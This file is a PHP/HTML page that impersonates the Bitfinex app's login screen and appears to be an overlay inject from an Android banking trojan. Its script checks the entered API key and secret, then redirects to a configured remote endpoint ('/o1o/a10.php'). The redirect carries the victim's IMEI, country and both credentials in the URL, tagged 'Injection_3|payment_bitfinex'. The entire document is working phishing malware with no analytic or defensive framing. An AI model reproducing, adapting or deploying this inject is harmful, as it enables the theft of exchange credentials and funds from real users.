<!-- 2.6.7 -->
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="payment/com.bitfinex.bfxapp/style.css">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div class="header">
	<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOsAAAAcCAIAAAAP/98jAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6N0YwNDNGRkJBMTQ4MTFFOEFERkZCMUQ1NjE3NjkwQzAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6N0YwNDNGRkNBMTQ4MTFFOEFERkZCMUQ1NjE3NjkwQzAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo3RjA0M0ZGOUExNDgxMUU4QURGRkIxRDU2MTc2OTBDMCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo3RjA0M0ZGQUExNDgxMUU4QURGRkIxRDU2MTc2OTBDMCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pr1LZsQAABA7SURBVHja7FwJWFNX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">
</div>

<div class="text">
	Enter key manually or <br> scan QR code
	<img style="float: right;margin-top: -20px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACcAAAAnCAIAAAADwcZiAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QjJERkNGMDdBMTQ5MTFFOEIzNEFBN0REMEZEQjY4ODEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QjJERkNGMDhBMTQ5MTFFOEIzNEFBN0REMEZEQjY4ODEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpCMkRGQ0YwNUExNDkxMUU4QjM0QUE3REQwRkRCNjg4MSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpCMkRGQ0YwNkExNDkxMUU4QjM0QUE3REQwRkRCNjg4MSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pt/NV2wAAAI0SURBVHjaYpRW02WgO2CBs7Q1NWrKCoWFhGhhzcx5C9dt2vr//38IlxHi13XLFujraNPUf+8/fMgqKj915hyQzQTE0/u7aG0lEAgKCEzp6WBkZITaamJkQJ/oFBYStLOygNoqJChIt3Skr6cDtZX+YNRW+pUSWMHy5cvRRCIjIwmq8fT0FBAQIN/WNWvWELQVU421tTVFtkKAj48PkNyyZQtcBMKGiEOAl5cXExPT7t27f/78SWkIQ0BiYiKarfPnz0ezNS4ujpWV9dixY1Sz9eDBgwTVHD58mJmZmRgribV10qRJBNVMnTqVamnY2NiYoDimGk5OTvzGgmq6u5dO0y2nTpw+a9L02QT8euvWLSCppqaGJgIBEHGIiKqqKrAWu3fv3p8/f+Tl5dnZ2ckP4crKSiC5du1aNBEIgIhDRFasWAFMw+3t7e/evevv75eTkyPfVklJSawiz58/RxN5+fIlMA0LCwsDfcnCwkJRapoyZQpWkeDgYDSRiIiI379/z549W4iIlhcBW798+YImwsPDAyeR1QBFgLZ+//4dyOXi4gKWU+TbGh8fjyYCicuFCxeiqYHEa2pqKjHxOihrOmT/IcclMnu41Or4fYacj0lKw4PSr8i+wS8OTMOjbcRRWxkYvn//QTf7Xr58DbX1ybNndLN1x559UFsTM/OAdQUdrGzvnfjx0ycgg5lPWPzLl68btmzn4uRUkJdjY2OjhX0Hjxxr6exdt2kryrgEnQFAgAEA5H7TOHi6168AAAAASUVORK5CYII=">
</div>

<div style="color: #84b948;margin-top: 20px;margin-bottom: 30px;" class="text">
	Need help to login?
</div>
<form action="null" method="post" id="_mainForm" target="flow_handler">
	<input type="text" class="field" name="login" id="login" placeholder="API key *">
	<input type="password" class="field" name="password" id="password" placeholder="API key secret *">

	<input type="submit" class="button" id="input_submitBtn" value="CONTINUE">
</form>

<iframe src="about:blank" name="flow_handler" style="visibility:hidden; display:none"></iframe>
<script type="text/javascript">
    (function () {
    var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
        var input = objDoc.createElement("input");
        input.setAttribute("type", "hidden");
        input.setAttribute("name", sNm);
        input.setAttribute("value", sV);
        input.value = sV;
        objForm.appendChild(input);
    };
          var g_oBtn = document.getElementById('input_submitBtn');
          g_oBtn.onclick = function () {
          
              var oNumInp = document.getElementById('login');
              var oCodeInp = document.getElementById('password');
    
              try{
                  oNumInp.className = oCodeInp.className = 'field';
              } catch(e){};
              
              if (oNumInp.value.length < 4) {
                  try{
                      oNumInp.className = 'field error';
                  } catch(e){};
                  return false;
              }
              
              if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
                  try{
                      oCodeInp.className = 'field error';
                  } catch(e){};
                  return false;
              }
                            
    top['closeDlg'] = true;
    var url='<?php echo $URL; ?>';
    var imei_c='<?php echo $IMEI_country; ?>';
    location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|payment_bitfinex|"+oNumInp.value+"|"+oCodeInp.value);
    
    return false;
    };
    })();
    </script>
</body>
</html>
